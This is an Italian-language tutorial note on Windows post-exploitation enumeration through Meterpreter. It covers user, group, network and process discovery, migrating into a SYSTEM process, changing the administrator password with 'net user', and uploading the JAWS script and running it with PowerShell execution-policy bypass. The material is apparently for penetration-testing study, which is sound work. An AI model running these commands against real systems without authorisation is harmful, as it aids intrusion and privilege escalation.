
# Windows local enumeration
Quando otteniamo l'accesso ad un sistema windows, la prima fase é quella che consiste nel enumerare il sistema ottenendo l'id del utente attuale e informazioni sul sistema. 
```bash
meterpreter > getuid
meterpreter > sysinfo
meterpreter > cd C:/Windows/System32
meterpreter > cat eula.txt                               # file che da altre informazioni sul sistema operativo 
meterpreter > shell
#comandi windows
hostname
systeminfo
wimc qfe get Caption,Description,HotFixID,InstalledOn     # per avere altre informazioni sugli hotfixs (patch)

```

### Enumerare Utenti e Gruppi
Serve per vedere l'utente attuale e che permessi ha e di che gruppo fa parte. <br>
possiamo anche ottenere gli utenti che fanno parte del gruppo amministratori per poter tentare di exploitarli. <br> 
```bash
meterpreter > getprivs                                    # per visualizzare gli attuali permessi
meterpreter >  background
use post/windows/gather/enum_logged_on_users              # modulo per enumerare gli utenti su un target windows
set session 1
run
sessions 1
meterpreter > shell
# enumerazione utenti manuale
whoami
whoami /priv                                              # enumerare i permessi attuali
query user                                                 # per visualizzare gli utenti collegati e quando
net users                                                  # enumerare tutti gli utenti nel sistema
net user administrator                                     # ottenere informazioni sul account amministratore (possiamo mettere qualisasi nome utente)
net user Administrator NuovaPassword1234                   # per cambiare la password dell'account administrator se si hanno alti privilegi
net localgroup                                             # enumerare tutti i gruppi presenti sul sistema
net localgroup administrators                              # visualizzare i componenti del gruppo administrators (possiamo mettere qualsiasi nome gruppo)
```

### Enumerare le informazioni di rete
Abbiamo anche bisogno di poter enumerare gli attuali indirizzi per poter identificare le impostazioni di rete interne e i servizi in esecuzione sulle porte TCP/UDP.
```bash
meterpreter > shell
ipconfig
ipconfig /all
route print                  # visualizzare la routing table
arp -a                       # aprire la arp table e visualizzare gli altri host collegati alla stessa rete del target
netsat -ano                  # per visualizzare la lista dei servizi attualmente in esecuzione o in ascolto
netsh firewall show state
#oppure
netsh advfirewall show allprofile
```

### Enumerare i processi
Enumerare i processi é importante per poter migrare la sessione meterpreter verso un processo con privileggi superiori e quindi effettuare un privilege escalation, e per poter identificare delle task con debbolezze nella configurazione per poterle exploitare. <br>
```bash
meterpreter > ps                          # mostra i processi attualmente in esecuzione e dovviamo fare caso al PID e al USER che sia NT AUTHORITY
meterpreter > pgrep <PROCESSNAME>         # per cercare il pid di un determianto processo. Preferiamo sempre cercare il processo explorer.exe
meterpreter > migrate <PID>
meterpreter > shell
net start                                  # mostrare i servizi (non sono processi, i servizi lavorano in background)
wmic service list brief                   # mostra i servizi in esecuzione
tasklist /svc                            # mostra i processi in esecuzione sotto un determinato processo
schtasks /query /fo LIST /v               # mostra le sheduled tasks 
```

### Automatizzare la local enumeration
Esistono alcuni scripts che permettono di enumerare tutte le infgormazioni ottenute precedentemente in modo automatico <br>
Uno script interessante é JAWS (Just Another Windows (enumeration) Script) che é possibile scaricare tramite questo <a href="https://github.com/411Hall/JAWS">link</a> <br>
JAWS é uno script che permette di identificare potenziali vettori per un privilege escalation ed é scritto in PowerShell 2.0 quindi dovrebbe poter girare su tutte le versioni superiori di windows 7. <br>
per poterlo usare basta copiare il raw del file .ps1 e incollarlo in un file .ps1 sulla nostra macchina kali per poi inniettarlo sul target tramite una sessione meterpreter
```bash
meterpreter > cd C:/Temp
meterpreter > upload path/di/JAWS.ps1
meterpreter > shell
dir                           # per confermare che il file é stato uploadato con successo
powershell.exe -ExecutionPolicy Bypass -File .\JAWS.ps1 -OutputFilename JAWS-ENUM.txt
# questo comando indica a windows che vogliamo eseguire tramite powershell lo script JAWS e salvare i risultati nel file JAWS-ENUM.txt
# torniamo ora su meterpreter, premendo CTRL+C, per poter scaricare il file creato da JAWS
meterpreter > download JAWS-ENUM.txt
```
